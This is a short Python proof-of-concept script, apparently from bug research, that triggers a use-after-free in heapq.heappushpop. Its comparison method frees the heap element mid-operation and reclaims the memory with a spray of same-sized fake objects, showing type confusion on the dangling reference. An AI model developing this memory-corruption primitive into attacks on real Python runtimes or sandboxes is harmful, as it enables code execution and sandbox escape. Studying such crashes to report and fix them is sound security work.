import heapq
import sys

class Target:
    def __init__(self, val):
        self.val = val

class FakeTarget:
    def __init__(self, val):
        self.val = val

class Evil:
    def __gt__(self, other):
        # Free other
        heap[0] = None
        
        # Reclaim with FakeTarget (same size!)
        global spray
        spray = [FakeTarget(999) for _ in range(100)]
        
        try:
            print(f'After reclaim, other type: {type(other)}')
            print(f'After reclaim, other.val: {other.val}')
        except Exception as e:
            print(f'Error accessing type: {e}')
            
        return True

heap = [Target(42)]
evil = Evil()

print('Calling heappushpop...')
heapq.heappushpop(heap, evil)
print('Done')
